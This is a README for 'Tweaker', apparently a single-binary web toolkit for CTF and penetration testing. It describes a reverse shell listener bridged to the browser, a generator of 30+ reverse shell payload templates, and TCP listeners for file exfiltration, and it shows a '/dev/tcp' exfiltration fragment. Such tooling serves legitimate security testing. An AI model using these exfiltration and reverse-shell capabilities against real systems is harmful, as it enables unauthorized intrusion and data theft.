# Tweaker

All-in-one web toolkit for CTF competitions and penetration testing. Single binary, zero dependencies, works in air-gapped environments.

## Features

**File Share** — upload, download, browse and manage files through the web UI. Right-click any file to get ready-made download commands for the target (wget, curl, certutil, PowerShell, python, php, /dev/tcp, nc). Public `/dl/` endpoint serves files without auth for easy target retrieval.

**TCP Catch & Serve** — one-click TCP listeners for file exfiltration (`cat file > /dev/tcp/...`) and delivery (`cat < /dev/tcp/...`) when HTTP isn't available on the target.

**Reverse Shell Manager** — built-in TCP listener accepts reverse shells and bridges them to the browser via WebSocket. Features:
- **xterm.js terminal** — full ANSI rendering, cursor positioning, colors, Ctrl+C/D/Tab, clipboard
- **Multiple tabs** — connect to several shells simultaneously, switch between them
- **Output buffer** — 64KB ring buffer per session, reconnect without losing history
- **Fullscreen mode** — toggle for focused work
- **Command templates** — one-click paste of common commands (PTY upgrade, LinPEAS, SUID search, etc.), editable via API
- **Download/Upload buttons** — paste transfer commands directly into the active shell

**Shell Generator** — built-in reverse shell payload generator with 30+ templates (Bash, Netcat, Socat, Python, PHP, Perl, Ruby, PowerShell, etc.), filterable by OS, with configurable IP/port/shell.

**File Viewer** — chunked text/hex preview with interactive hex dump (byte highlight on hover), lazy-loading for large files.

## Quick Start

Download a binary from [Releases](https://github.com/SelfScriptKiddies/tweaker/releases) or build from source:

```bash
make build
```

Then:

```bash
# Generate default config
./tweaker --init

# Edit to taste
vim config.yaml

# Run
./tweaker
```

If no `config.yaml` is found, the server starts with defaults (port 8080, random password printed to stdout).

## Configuration

`./tweaker --init` generates a `config.yaml` with all options:

```yaml
server:
  host: "0.0.0.0"
  port: 8080

log:
  level: "info"          # debug, info, warn, error
  env: "local"           # local, prod

auth:
  username: "admin"
  password: ""           # auto-generated if empty (printed to stdout)
  secret_cookie: ""      # auto-generated if empty

files:
  directory: "./files"   # file storage directory

shells:
  listen_port: 4444      # TCP port for reverse shell connections

templates:
  file: "templates.yaml" # command templates file (created on first run)
```

Use `-c path/to/config.yaml` to specify a custom config path.

## Building

```bash
make build           # local binary → bin/tweaker
make release-all     # all platforms (linux/mac/windows, amd64/arm64)
make release-linux   # linux amd64 + arm64 only
```

All binaries are static (`CGO_ENABLED=0`), stripped, and embed all frontend assets.

## API

| Method | Endpoint | Description |
|--------|----------|-------------|
| `GET` | `/api/files?path=` | List directory |
| `POST` | `/api/files/upload?path=` | Upload file (multipart) |
| `POST` | `/api/files/mkdir` | Create directory |
| `DELETE` | `/api/files?path=` | Delete file/directory |
| `POST` | `/api/files/rename` | Rename file/directory |
| `GET` | `/api/files/download?path=` | Download file |
| `GET` | `/api/files/preview?path=&mode=&offset=` | Chunked preview (text/hex) |
| `POST` | `/api/files/serve` | Serve file over one-shot TCP port |
| `POST` | `/api/files/catch` | Catch incoming file over TCP |
| `GET` | `/api/shells` | List active shell sessions |
| `DELETE` | `/api/shells/{id}` | Kill shell session |
| `POST` | `/api/shells/listener` | Restart shell listener on new port |
| `GET` | `/ws/shell/{id}` | WebSocket terminal bridge |
| `GET` | `/api/templates` | List command templates |
| `POST` | `/api/templates` | Add command template |
| `DELETE` | `/api/templates` | Delete command template |
| `GET` | `/dl/*` | Public file download (no auth) |

## Stack

- **Backend**: Go 1.24, `net/http` mux, gorilla/websocket, zap logger
- **Frontend**: Vanilla JS, xterm.js 5.5 (embedded), JetBrains Mono
- **Build**: Single static binary (`CGO_ENABLED=0`), all assets embedded via `go:embed`
